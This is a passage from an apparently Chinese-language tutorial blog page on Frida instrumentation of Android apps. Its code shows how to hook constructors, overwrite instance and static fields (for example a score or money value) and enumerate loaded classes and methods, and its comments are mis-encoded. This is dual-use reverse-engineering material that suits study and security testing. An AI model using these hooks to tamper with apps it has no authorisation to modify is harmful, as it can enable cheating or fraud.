class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// åœ¨å†…å­˜ä¸­æœç´¢ç±»çš„å®ä¾‹</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœåŒ¹é…ä¸Šæ‰§è¡Œå›è°ƒï¼Œå‚æ•°ä¸ºç±»å®ä¾‹</span></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found `HookedObject` instance:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// æ‰“å°ç§æœ‰æˆå‘˜å˜é‡çš„å€¼ï¼Œéœ€è¦[field].value</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.score =&quot;</span>, instance.<span class="property">score</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// æ‰“å°é™æ€æˆå‘˜å˜é‡çš„å€¼</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HookedObject.msg =&quot;</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">msg</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// ä¿®æ”¹æˆå‘˜å˜é‡çš„å€¼</span></span><br><span class="line">                instance.<span class="property">score</span>.<span class="property">value</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="built_in">parseInt</span>(<span class="string">&quot;-900&quot;</span>);</span><br><span class="line">                <span class="comment">// æ‰“å°ä¿®æ”¹ä¹‹åçš„å€¼</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.score =&quot;</span>, instance.<span class="property">score</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// ä¸æ–¹æ³•åŒåçš„æˆå‘˜å˜é‡ï¼Œéœ€å‰é¢åŠ _</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance.stringTwo =&quot;</span>, instance.<span class="property">_stringTwo</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// æœç´¢å®Œæˆæ‰§è¡Œå›è°ƒ</span></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found Completed&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Fridaé™„åŠ ä¸Šåå»¶è¿Ÿ5ç§’æ‰§è¡Œï¼ŒæœŸé—´ç”±äºé€»è¾‘é—®é¢˜éœ€è¦ä¸»åŠ¨ç‚¹å‡»æŒ‰é’®æ¥å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="built_in">setTimeout</span>(invoke, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure><h3 id="é™æ€å˜é‡ä¿®æ”¹"><a href="#é™æ€å˜é‡ä¿®æ”¹" class="headerlink" title="é™æ€å˜é‡ä¿®æ”¹"></a>é™æ€å˜é‡ä¿®æ”¹</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">staticField</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸º staticField çš„å‡½æ•°ï¼Œæ²¡æœ‰å‚æ•°ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform æ˜¯ä¸€ä¸ª Frida APIï¼Œç”¨äºç¡®ä¿åœ¨å½“å‰çº¿ç¨‹ä¸Šæ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚</span></span><br><span class="line">        <span class="comment">// è¿™é€šå¸¸ç”¨äºç¡®ä¿ä»£ç åœ¨ Java è™šæ‹Ÿæœºä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> divscale = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ Java.use æ–¹æ³•è·å–å¯¹ç±» com.example.junior.util.Arith çš„å¼•ç”¨ï¼Œ</span></span><br><span class="line">        <span class="comment">// ç„¶åè®¿é—®é™æ€å­—æ®µ DEF_DIV_SCALE çš„å€¼ï¼Œå¹¶å°†å…¶èµ‹ç»™å˜é‡ divscaleã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divscale1 is =&gt;&quot;</span>, divscale);</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ console.log æ‰“å°åŸå§‹çš„ DEF_DIV_SCALE å­—æ®µçš„å€¼ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span> = <span class="number">20</span>;</span><br><span class="line">        <span class="comment">// å†æ¬¡ä½¿ç”¨ Java.use æ–¹æ³•è®¿é—®ç±» com.example.junior.util.Arithï¼Œ</span></span><br><span class="line">        <span class="comment">// å¹¶å°†é™æ€å­—æ®µ DEF_DIV_SCALE çš„å€¼ä¿®æ”¹ä¸º 20ã€‚</span></span><br><span class="line"></span><br><span class="line">        divscale = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.junior.util.Arith&quot;</span>).<span class="property">DEF_DIV_SCALE</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="comment">// é‡æ–°è¯»å–ä¿®æ”¹åçš„ DEF_DIV_SCALE å­—æ®µçš„å€¼ï¼Œå¹¶æ›´æ–°å˜é‡ divscaleã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divscale2 is =&gt;&quot;</span>, divscale);</span><br><span class="line">        <span class="comment">// å†æ¬¡æ‰“å°ä¿®æ”¹åçš„ DEF_DIV_SCALE å­—æ®µçš„å€¼ï¼Œä»¥éªŒè¯æ˜¯å¦æˆåŠŸä¿®æ”¹ã€‚</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éé™æ€å‡½æ•°ä¸­çš„å˜é‡ä¿®æ”¹"><a href="#éé™æ€å‡½æ•°ä¸­çš„å˜é‡ä¿®æ”¹" class="headerlink" title="éé™æ€å‡½æ•°ä¸­çš„å˜é‡ä¿®æ”¹"></a>éé™æ€å‡½æ•°ä¸­çš„å˜é‡ä¿®æ”¹</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dynamicField</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸º dynamicField çš„å‡½æ•°ï¼Œæ²¡æœ‰å‚æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform æ˜¯ä¸€ä¸ª Frida APIï¼Œç”¨äºç¡®ä¿åœ¨å½“å‰çº¿ç¨‹ä¸Šæ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚</span></span><br><span class="line">        <span class="comment">// è¿™é€šå¸¸ç”¨äºç¡®ä¿ä»£ç åœ¨ Java è™šæ‹Ÿæœºä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.junior.CalculatorActivity&quot;</span>, &#123;</span><br><span class="line">            <span class="comment">// Java.choose æ˜¯ä¸€ä¸ª Frida APIï¼Œç”¨äºæšä¸¾å½“å‰å †ä¸Šæ‰€æœ‰å±äºæŒ‡å®šç±»çš„å®ä¾‹ã€‚</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="comment">// å½“æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„å®ä¾‹æ—¶ï¼Œä¼šè°ƒç”¨æ­¤å‡½æ•°ã€‚</span></span><br><span class="line">                <span class="comment">// å‚æ•° instance æ˜¯å½“å‰æ‰¾åˆ°çš„ç±»çš„å®ä¾‹ã€‚</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance =&gt;&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// æ‰“å°æ‰¾åˆ°çš„å®ä¾‹ï¼Œä»¥ä¾¿è°ƒè¯•æˆ–ç¡®è®¤ã€‚</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance showText is =&gt;&quot;</span>, instance.<span class="property">showText</span>.<span class="property">value</span>);</span><br><span class="line">                <span class="comment">// æ‰“å°å®ä¾‹ä¸­ showText å­—æ®µçš„å½“å‰å€¼ã€‚</span></span><br><span class="line"></span><br><span class="line">                instance.<span class="property">showText</span>.<span class="property">value</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">                <span class="comment">// ä¿®æ”¹å®ä¾‹ä¸­ showText å­—æ®µçš„å€¼ä¸º &quot;123&quot;ã€‚</span></span><br><span class="line">                <span class="comment">// è¿™å‡è®¾ showText æ˜¯ä¸€ä¸ªå¯ä»¥è®¿é—®ä¸”å¯ä¿®æ”¹çš„å­—æ®µã€‚</span></span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">// å½“æ‰€æœ‰å®ä¾‹éƒ½å·²ç»è¢«æšä¸¾åï¼Œä¼šè°ƒç”¨æ­¤å‡½æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Search complete&#x27;</span>);</span><br><span class="line">                <span class="comment">// æ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼Œè¡¨æ˜æœç´¢è¿‡ç¨‹å·²ç»å®Œæˆã€‚</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hookæ„é€ å‡½æ•°-init"><a href="#Hookæ„é€ å‡½æ•°-init" class="headerlink" title="Hookæ„é€ å‡½æ•°$init"></a>Hookæ„é€ å‡½æ•°$init</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// We need to replace .$init() instead of .$new(), since .$new() = .alloc() + .init()</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Money&#x27;</span>);</span><br><span class="line">    money.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ„é€ å‡½æ•°Hookä¸­...&quot;</span>, a, b);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook æ„é€ æ–¹æ³• $init</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MoneyClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kevin.app.Money&quot;</span>);</span><br><span class="line">    <span class="title class_">MoneyClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Money $init&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.$init();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MoneyClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">    <span class="title class_">MoneyClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hook Money init&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> myX = <span class="title class_">StringClass</span>.<span class="title function_">new</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myY = <span class="number">9999</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(myX, myY);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="æœ‰å‚æ„é€ ä¸»åŠ¨è°ƒç”¨"><a href="#æœ‰å‚æ„é€ ä¸»åŠ¨è°ƒç”¨" class="headerlink" title="æœ‰å‚æ„é€ ä¸»åŠ¨è°ƒç”¨"></a>æœ‰å‚æ„é€ ä¸»åŠ¨è°ƒç”¨</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Utils.test(new Money(200ï¼Œ&quot;ç¾å…ƒ&quot;))</span></span><br><span class="line"><span class="comment">// è¿™è¡Œæ˜¯ä¸€ä¸ªæ³¨é‡Šï¼Œè¡¨ç¤ºä¸€ä¸ªå¯èƒ½çš„è°ƒç”¨åœºæ™¯ï¼Œå³è°ƒç”¨ Utils ç±»çš„ test æ–¹æ³•ï¼Œå¹¶ä¼ å…¥ä¸€ä¸ª Money ç±»çš„å®ä¾‹ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Java.perform æ˜¯ä¸€ä¸ª Frida APIï¼Œç”¨äºç¡®ä¿åœ¨å½“å‰çº¿ç¨‹ä¸Šæ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚</span></span><br><span class="line">    <span class="comment">// è¿™é€šå¸¸ç”¨äºç¡®ä¿ä»£ç åœ¨ Java è™šæ‹Ÿæœºä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Money&#x27;</span>)  <span class="comment">// å¦‚æœè¦è‡ªå®šä¹‰å®ä¾‹åŒ–å°±è¦è·å–å¹¶é‡å†™</span></span><br><span class="line">    <span class="comment">// è·å– Money ç±»çš„å¼•ç”¨ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨åç»­ä»£ç ä¸­ä½¿ç”¨å®ƒæ¥åˆ›å»ºæ–°çš„å®ä¾‹ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xx.app.Utils&#x27;</span>);</span><br><span class="line">    <span class="comment">// è·å– Utils ç±»çš„å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">    utils.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&quot;com.xx.app.Money&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123; </span><br><span class="line">        <span class="comment">// ä½¿ç”¨ Frida çš„ overload æ–¹æ³•æŒ‡å®šè¦æŒ‚é’©çš„ test æ–¹æ³•çš„å…·ä½“é‡è½½ç‰ˆæœ¬ï¼Œ</span></span><br><span class="line">        <span class="comment">// è¿™é‡ŒæŒ‡å®šçš„æ˜¯æ¥å—ä¸€ä¸ª com.xx.app.Money ç±»å‹å‚æ•°çš„é‡è½½ã€‚</span></span><br><span class="line">        <span class="comment">// ç„¶åå°†è¯¥æ–¹æ³•çš„å®ç°æ›¿æ¢ä¸ºä¸€ä¸ªæ–°çš„å‡½æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> myBytes = <span class="title class_">StringClass</span>.$new(<span class="string">&quot;Hello World&quot;</span>).<span class="title function_">getBytes</span>();</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ String å®ä¾‹ï¼Œå†…å®¹ä¸º &quot;Hello World&quot;ï¼Œå¹¶è·å–å…¶å­—èŠ‚è¡¨ç¤ºã€‚</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šè¿™é‡Œ StringClass åº”è¯¥æ˜¯ Java ç±» java.lang.String çš„å¼•ç”¨ï¼Œ</span></span><br><span class="line">        <span class="comment">// ä½†æ˜¯åœ¨ä»£ç ä¸­æ²¡æœ‰çœ‹åˆ° StringClass çš„å®šä¹‰ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªç–å¿½ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡æ–°å®ä¾‹åŒ–  $new()</span></span><br><span class="line">        <span class="keyword">var</span> mon = money.$new(<span class="number">999</span>,<span class="string">&#x27;æˆ‘çš„å¤©&#x27;</span>)</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ $new æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„ Money å®ä¾‹ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ 999 å’Œ &quot;æˆ‘çš„å¤©&quot;ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mon.<span class="title function_">getInfo</span>();  <span class="comment">// æ ¹æ®éœ€æ±‚return</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨æ–°åˆ›å»ºçš„ Money å®ä¾‹çš„ getInfo æ–¹æ³•ï¼Œå¹¶è¿”å›å…¶ç»“æœã€‚</span></span><br><span class="line">        <span class="comment">// è¿™æ„å‘³ç€åŸå§‹çš„ test æ–¹æ³•çš„è¡Œä¸ºè¢«ä¿®æ”¹ï¼Œç°åœ¨å®ƒå°†è¿”å›æ–°åˆ›å»ºçš„ Money å®ä¾‹çš„ä¿¡æ¯ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="2-æšä¸¾ç±»-æ–¹æ³•-æ¥å£enumerateLoadedClasses"><a href="#2-æšä¸¾ç±»-æ–¹æ³•-æ¥å£enumerateLoadedClasses" class="headerlink" title="2. æšä¸¾ç±»&amp;æ–¹æ³•&amp;æ¥å£enumerateLoadedClasses"></a>2. æšä¸¾ç±»&amp;æ–¹æ³•&amp;æ¥å£enumerateLoadedClasses</h2><h3 id="æšä¸¾æ‰€æœ‰çš„ç±»å¹¶å®šä½ç±»ä»£ç ç¤ºä¾‹"><a href="#æšä¸¾æ‰€æœ‰çš„ç±»å¹¶å®šä½ç±»ä»£ç ç¤ºä¾‹" class="headerlink" title="æšä¸¾æ‰€æœ‰çš„ç±»å¹¶å®šä½ç±»ä»£ç ç¤ºä¾‹"></a>æšä¸¾æ‰€æœ‰çš„ç±»å¹¶å®šä½ç±»ä»£ç ç¤ºä¾‹</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;n[*] enumerating classes...&quot;</span>);</span><br><span class="line">    <span class="comment">//Javaå¯¹è±¡çš„API enumerateLoadedClasses</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">      <span class="comment">//è¯¥å›è°ƒå‡½æ•°ä¸­çš„_classNameå‚æ•°å°±æ˜¯ç±»çš„åç§°ï¼Œæ¯æ¬¡å›è°ƒæ—¶éƒ½ä¼šè¿”å›ä¸€ä¸ªç±»çš„åç§°</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">_className</span>)&#123;</span><br><span class="line">        <span class="comment">//åœ¨è¿™é‡Œå°†å…¶è¾“å‡º</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] found instance of &#x27;&quot;</span>+_className+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¦‚æœåªéœ€è¦æ‰“å°å‡ºcom.roysueåŒ…ä¸‹æ‰€æœ‰ç±»æŠŠè¿™æ®µæ³¨é‡Šå³å¯ï¼Œæƒ³æ‰“å°å…¶ä»–çš„æ›¿æ¢æ‰indexOfä¸­å‚æ•°å³å¯å®šä½åˆ°~</span></span><br><span class="line">        <span class="comment">//if(_className.toString().indexOf(&quot;com.roysue&quot;)!=-1)</span></span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="comment">//    console.log(&quot;[*] found instance of &#x27;&quot;+_className+&quot;&#x27;&quot;);</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//ä¼šåœ¨æšä¸¾ç±»ç»“æŸä¹‹åå›è°ƒä¸€æ¬¡æ­¤å‡½æ•°</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•å¹¶å®šä½æ–¹æ³•ä»£ç "><a href="#æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•å¹¶å®šä½æ–¹æ³•ä»£ç " class="headerlink" title="æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•å¹¶å®šä½æ–¹æ³•ä»£ç "></a>æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•å¹¶å®šä½æ–¹æ³•ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Hookç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> md5 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xxx.xxx.xxx&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> methods = md5.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_overload_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//ç¡®è®¤Javaè¿è¡Œæ—¶ç¯å¢ƒæ˜¯å¦å¯ç”¨,å¦‚æœå¯ç”¨ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="comment">//æšä¸¾com.roysue.roysueapplication.User$clzç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚</span></span><br><span class="line">           <span class="keyword">var</span> a = <span class="title function_">enumMethods</span>(<span class="string">&quot;com.roysue.roysueapplication.User$clz&quot;</span>)</span><br><span class="line">           a.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">s</span>) &#123;</span><br><span class="line">               <span class="comment">//å°†è¿™äº›æ–¹æ³•åæ‰“å°åˆ°æ§åˆ¶å°</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">           &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æšä¸¾æ¥å£å®ç°"><a href="#æšä¸¾æ¥å£å®ç°" class="headerlink" title="æšä¸¾æ¥å£å®ç°"></a>æšä¸¾æ¥å£å®ç°</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">searchInterface</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸º searchInterface çš„å‡½æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// Java.perform ç¡®ä¿æ¥ä¸‹æ¥çš„ä»£ç åœ¨ Java çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="comment">// Java.enumerateLoadedClasses ç”¨äºæšä¸¾å½“å‰åŠ è½½çš„æ‰€æœ‰ Java ç±»ã€‚</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">            <span class="comment">// å½“æ‰€æœ‰ç±»éƒ½æšä¸¾å®Œæˆåï¼Œä¼šè°ƒç”¨æ­¤å‡½æ•°ã€‚è¿™é‡Œæ²¡æœ‰å®ç°ä»»ä½•æ“ä½œã€‚</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name, handle</span>)&#123;</span><br><span class="line">                <span class="comment">// å½“æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„ç±»æ—¶ï¼Œä¼šè°ƒç”¨æ­¤å‡½æ•°ã€‚</span></span><br><span class="line">                <span class="comment">// å‚æ•° name æ˜¯ç±»çš„å…¨åï¼Œhandle æ˜¯ç±»çš„å†…éƒ¨å¥æŸ„ã€‚</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.r0ysue.a0526printout&quot;</span>) &gt; -<span class="number">1</span>) &#123; <span class="comment">// ä½¿ç”¨åŒ…åè¿›è¡Œè¿‡æ»¤</span></span><br><span class="line">                    <span class="comment">// å¦‚æœç±»ååŒ…å« &quot;com.r0ysue.a0526printout&quot;ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;find class&quot;</span>);</span><br><span class="line">                    <span class="comment">// æ‰“å°ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæ‰¾åˆ°ä¸€ä¸ªç±»ã€‚</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="comment">// ä½¿ç”¨ Java.use è·å–ç±»çš„å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> interfaceList = targetClass.<span class="property">class</span>.<span class="title function_">getInterfaces</span>(); <span class="comment">// ä½¿ç”¨åå°„è·å–ç±»å®ç°çš„æ¥å£æ•°ç»„</span></span><br><span class="line">                    <span class="comment">// ä½¿ç”¨ getInterfaces æ–¹æ³•è·å–ç±»å®ç°çš„æ‰€æœ‰æ¥å£çš„åˆ—è¡¨ã€‚</span></span><br><span class="line"></span><br><span 